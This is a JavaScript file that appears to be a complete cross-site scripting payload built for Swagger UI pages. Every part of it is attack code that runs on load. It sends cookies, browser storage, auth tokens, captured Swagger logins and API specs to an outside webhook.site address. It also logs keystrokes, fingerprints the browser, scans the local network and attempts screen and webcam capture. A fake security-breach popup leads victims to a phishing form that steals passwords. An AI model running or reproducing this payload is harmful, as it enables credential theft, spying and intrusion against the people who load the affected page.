const WEBHOOK_URL = "https://webhook.site/c9a89a3d-e619-4d06-8281-76e8ecc54dc2";

const details = `
  🚨 XSS Detected 🚨
  ========================
  🏁 Origin: ${window.origin}
  🌐 Location: ${window.location}
  🔗 Href: ${window.location.href}
  🏢 Hostname: ${window.location.hostname}
  📂 Pathname: ${window.location.pathname}
  ❓ Search: ${window.location.search}
  👪 Parent Origin: ${window.parent?.origin || 'N/A'}
  🧑‍💻 Top Origin: ${window.top?.origin || 'N/A'}
  🖼️ Frames Length: ${window.frames.length}
  🪪 Window Name: ${window.name}
  ========================
  🍪 Cookies: ${document.cookie || 'No cookies available'}
  🕵️ User-Agent: ${navigator.userAgent}
  ⏳ Timestamp: ${new Date().toISOString()}
`;

function generateFingerprint() {
    const fingerprint = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        colorDepth: window.screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        touchSupport: 'ontouchstart' in window,
        doNotTrack: navigator.doNotTrack
    };

    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;

        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#FF0000';
        ctx.fillText('CyberTechAjju', 0, 0);
        ctx.fillStyle = '#00FF00';
        ctx.fillText('Swagger-UI-XSS', 0, 20);
        ctx.fillStyle = '#0000FF';
        ctx.fillRect(100, 30, 80, 10);

        fingerprint.canvasHash = canvas.toDataURL().slice(-50);
    } catch (e) {
        fingerprint.canvasHash = 'Not available';
    }

    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        fingerprint.webglVendor = gl.getParameter(gl.VENDOR);
        fingerprint.webglRenderer = gl.getParameter(gl.RENDERER);
    } catch (e) {
        fingerprint.webglData = 'Not available';
    }

    return fingerprint;
}

function scanLocalNetwork() {
    const results = { hosts: [] };
    const commonPorts = [80, 443, 8080, 8443];
    const privateIPs = ['192.168.0.', '192.168.1.', '10.0.0.', '10.0.1.'];

    privateIPs.forEach(ipBase => {
        for (let i = 1; i <= 10; i++) {
            const ip = ipBase + i;

            const img = new Image();
            img.onload = function() {
                results.hosts.push({ ip, status: 'active' });
                exfiltrateData({ type: 'network_scan', found: ip });
            };
            img.src = `http://${ip}/favicon.ico?${Math.random()}`;

            commonPorts.forEach(port => {
                const startTime = performance.now();
                fetch(`http://${ip}:${port}`, { mode: 'no-cors' })
                    .then(() => {
                        const endTime = performance.now();
                        if (endTime - startTime < 100) {
                            results.hosts.push({ ip, port, status: 'responded', time: endTime - startTime });
                        }
                    })
                    .catch(() => {});
            });
        }
    });

    try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.createDataChannel('');
        pc.onicecandidate = function(e) {
            if (!e.candidate) return;

            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (match) {
                const localIP = match[1];
                results.localIP = localIP;
                exfiltrateData({ type: 'local_ip', ip: localIP });
                pc.close();
            }
        };
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
    } catch (e) {
        results.webrtcError = e.toString();
    }

    setTimeout(() => exfiltrateData({ type: 'network_scan_results', results }), 5000);
}

function captureScreen() {
    try {
        navigator.mediaDevices.getDisplayMedia({ video: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();

                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        const screenshot = canvas.toDataURL('image/jpeg', 0.3);
                        exfiltrateData({ type: 'screenshot', image: screenshot });

                        stream.getTracks().forEach(track => track.stop());
                    }, 500);
                };
            })
            .catch(err => {
                console.log('Screen capture failed:', err);
            });
    } catch (e) {
        console.log('Screen capture not supported');
    }
}

function captureWebcam() {
    try {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();

                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        const webcamShot = canvas.toDataURL('image/jpeg', 0.3);
                        exfiltrateData({ type: 'webcam', image: webcamShot });

                        stream.getTracks().forEach(track => track.stop());
                    }, 1000);
                };
            })
            .catch(err => {
                exfiltrateData({ type: 'webcam_error', error: err.toString() });
            });
    } catch (e) {
        console.log('Webcam capture not supported');
    }
}

function createCredentialHarvester() {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0,0,0,0.85);
    z-index: 999999;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: Arial, sans-serif;
  `;

    const formContainer = document.createElement('div');
    formContainer.style.cssText = `
    background-color: white;
    border-radius: 8px;
    padding: 30px;
    width: 90%;
    max-width: 400px;
    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
  `;

    const domain = window.location.hostname;
    const companyName = domain.split('.')[0].charAt(0).toUpperCase() + domain.split('.')[0].slice(1);

    formContainer.innerHTML = `
    <div style="text-align: center; margin-bottom: 20px;">
      <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#E53935" stroke-width="2">
        <circle cx="12" cy="12" r="10"></circle>
        <line x1="12" y1="8" x2="12" y2="12"></line>
        <line x1="12" y1="16" x2="12" y2="16"></line>
      </svg>
      <h2 style="color: #E53935; margin: 10px 0;">Security Alert</h2>
      <p style="color: #333; margin-bottom: 20px;">Your session has expired due to suspicious activity. Please re-authenticate to continue.</p>
    </div>
    <form id="credential-form">
      <div style="margin-bottom: 15px;">
        <label for="username" style="display: block; margin-bottom: 5px; font-weight: bold; color: #555;">Username or Email</label>
        <input type="text" id="username" name="username" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;" required>
      </div>
      <div style="margin-bottom: 20px;">
        <label for="password" style="display: block; margin-bottom: 5px; font-weight: bold; color: #555;">Password</label>
        <input type="password" id="password" name="password" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;" required>
      </div>
      <button type="submit" style="width: 100%; padding: 12px; background-color: #0066cc; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">Secure Verification</button>
      <div style="margin-top: 15px; text-align: center; font-size: 12px; color: #666;">
        Protected by ${companyName} Security
      </div>
    </form>
  `;

    overlay.appendChild(formContainer);
    document.body.appendChild(overlay);

    document.getElementById('credential-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        exfiltrateData({
            type: 'harvested_credentials',
            username: username,
            password: password,
            domain: domain,
            timestamp: new Date().toISOString()
        });

        formContainer.innerHTML = `
      <div style="text-align: center;">
        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#4CAF50" stroke-width="2">
          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
          <polyline points="22 4 12 14.01 9 11.01"></polyline>
        </svg>
        <h2 style="color: #4CAF50; margin: 10px 0;">Verification Successful</h2>
        <p>Your session has been restored.</p>
      </div>
    `;

        setTimeout(() => {
            document.body.removeChild(overlay);
        }, 2000);
    });
}

alert(details);
console.log(details);

function createCustomPopup() {
    const popupContainer = document.createElement('div');
    popupContainer.style.cssText = `
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background-color: #f8d7da;
    border: 2px solid #dc3545;
    border-radius: 8px;
    padding: 20px;
    box-shadow: 0 0 20px rgba(0,0,0,0.5);
    z-index: 10000;
    width: 80%;
    max-width: 500px;
    font-family: Arial, sans-serif;
  `;

    const popupContent = document.createElement('div');

    const browser = navigator.userAgent.includes('Chrome') ? 'Chrome' :
        navigator.userAgent.includes('Firefox') ? 'Firefox' :
        navigator.userAgent.includes('Safari') ? 'Safari' : 'Your browser';

    popupContent.innerHTML = `
    <h2 style="color: #dc3545; text-align: center; margin-top: 0;">⚠️ CRITICAL SECURITY BREACH ⚠️</h2>
    <div style="text-align: center; margin-bottom: 15px;">
      <span style="display: inline-block; background-color: #dc3545; color: white; padding: 3px 8px; border-radius: 4px; font-size: 14px;">CVE-2023-9999</span>
    </div>
    <p style="font-size: 16px; margin-bottom: 15px; color: #721c24;"><strong>${browser} Security Alert:</strong> Your system has been compromised through a critical vulnerability. Malware has been detected executing the following operations:</p>
    <ul style="margin-bottom: 15px; color: #721c24;">
      <li>Unauthorized access to your cookies and session data</li>
      <li>Extraction of stored passwords and authentication tokens</li>
      <li>Access to camera and microphone permissions</li>
      <li>Network scanning of internal systems</li>
      <li>Screen capture and keylogging active</li>
    </ul>
    <div style="background-color: #f1f1f1; padding: 10px; border-radius: 4px; max-height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px;">
      ${details.replace(/\n/g, '<br>').replace(/ /g, '&nbsp;')}
    </div>
    <div style="margin-top: 15px; text-align: center;">
      <p style="color: #721c24; margin-bottom: 10px;"><strong>Immediate action required to secure your system!</strong></p>
      <button id="close-popup" style="padding: 8px 16px; background-color: #dc3545; color: white; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px;">Dismiss</button>
      <button id="verify-credentials" style="padding: 8px 16px; background-color: #0066cc; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify Identity</button>
    </div>
  `;

    popupContainer.appendChild(popupContent);
    document.body.appendChild(popupContainer);

    document.getElementById('close-popup').addEventListener('click', function() {
        document.body.removeChild(popupContainer);
    });

    document.getElementById('verify-credentials').addEventListener('click', function() {
        document.body.removeChild(popupContainer);
        setTimeout(createCredentialHarvester, 500);
    });
}

console.log(details);

function exfiltrateData(data) {
    const enrichedData = {
        ...data,
        timestamp: new Date().toISOString(),
        url: window.location.href
    };

    const img = new Image();
    img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(enrichedData))}&t=${Date.now()}`;

    try {
        fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'text/plain' },
            body: JSON.stringify(enrichedData)
        });
    } catch (e) {}

    try {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', WEBHOOK_URL, true);
        xhr.setRequestHeader('Content-Type', 'text/plain');
        xhr.send(JSON.stringify(enrichedData));
    } catch (e) {}
}

function stealCookies() {
    const cookieData = {
        type: 'cookies',
        cookies: document.cookie,
        url: window.location.href
    };
    exfiltrateData(cookieData);
}

function stealStorage() {
    const storageData = {
        type: 'storage',
        localStorage: {},
        sessionStorage: {}
    };

    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storageData.localStorage[key] = localStorage.getItem(key);
        }
    } catch (e) {
        storageData.localStorage = 'Error accessing localStorage';
    }

    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            storageData.sessionStorage[key] = sessionStorage.getItem(key);
        }
    } catch (e) {
        storageData.sessionStorage = 'Error accessing sessionStorage';
    }

    exfiltrateData(storageData);
}

function extractSwaggerInfo() {
    const swaggerData = {
        type: 'swagger',
        endpoints: [],
        authInfo: {},
        version: 'unknown'
    };

    try {
        const pathElems = document.querySelectorAll('.opblock-summary-path');
        for (const el of pathElems) {
            swaggerData.endpoints.push(el.textContent.trim());
        }

        swaggerData.authInfo.hasAuth = !!document.querySelector('.auth-wrapper, .authorize');

        const versionMatch = document.body.innerHTML.match(/swagger-ui-([0-9.]+)/);
        if (versionMatch) {
            swaggerData.version = versionMatch[1];
        }

        const specUrlMatch = document.body.innerHTML.match(/url:\s*["']([^"']+)["']/);
        if (specUrlMatch) {
            swaggerData.specUrl = specUrlMatch[1];

            fetch(specUrlMatch[1])
                .then(r => r.json())
                .then(spec => {
                    exfiltrateData({
                        type: 'api_spec',
                        spec: spec
                    });
                })
                .catch(() => {});
        }
    } catch (e) {
        swaggerData.error = e.message;
    }

    exfiltrateData(swaggerData);
}

function findAuthTokens() {
    const tokenData = {
        type: 'tokens',
        jwt: [],
        oauth: {},
        other: {}
    };

    const tokenKeys = ['token', 'accessToken', 'access_token', 'auth', 'jwt', 'bearer', 'id_token'];
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (tokenKeys.some(tk => key.toLowerCase().includes(tk))) {
                const value = localStorage.getItem(key);
                if (value.match(/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/)) {
                    tokenData.jwt.push({ key, value });
                } else {
                    tokenData.other[key] = value;
                }
            }
        }
    } catch (e) {
        tokenData.error = e.message;
    }

    try {
        if (window.ui && window.ui.authSelectors) {
            const authData = window.ui.authSelectors.authorized();
            if (authData) {
                tokenData.oauth = authData;
            }
        }
    } catch (e) {
        tokenData.oauthError = e.message;
    }

    exfiltrateData(tokenData);
}

function hookSwaggerAuth() {
    try {
        const checkInterval = setInterval(() => {
            if (window.ui && window.ui.authActions && window.ui.authActions.authorize) {
                clearInterval(checkInterval);

                const origAuth = window.ui.authActions.authorize;
                window.ui.authActions.authorize = function(payload) {
                    exfiltrateData({
                        type: 'auth_capture',
                        auth_data: payload
                    });

                    return origAuth.apply(this, arguments);
                };
            }
        }, 500);
    } catch (e) {}
}

function setupKeylogger() {
    let buffer = '';
    let lastInput = null;

    document.addEventListener('input', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            lastInput = e.target;

            const isPassword = e.target.type === 'password';
            const fieldName = e.target.name || e.target.id || 'unknown';

            exfiltrateData({
                type: 'input',
                field: fieldName,
                isPassword: isPassword,
                value: isPassword ? '********' : e.target.value,
                url: window.location.href
            });
        }
    });

    document.addEventListener('submit', function(e) {
        const formData = {};
        const form = e.target;

        for (const element of form.elements) {
            if (element.name) {
                formData[element.name] = element.type === 'password' ? '********' : element.value;
            }
        }

        exfiltrateData({
            type: 'form_submit',
            formAction: form.action,
            formMethod: form.method,
            formData: formData,
            url: window.location.href
        });
    });
}

setTimeout(createCustomPopup, 500);

stealCookies();
stealStorage();
setTimeout(extractSwaggerInfo, 1000);
setTimeout(findAuthTokens, 1500);
setTimeout(hookSwaggerAuth, 2000);

const fingerprint = generateFingerprint();
exfiltrateData({ type: 'fingerprint', data: fingerprint });

setupKeylogger();

setTimeout(scanLocalNetwork, 3000);
setTimeout(captureScreen, 5000);
setTimeout(captureWebcam, 7000);
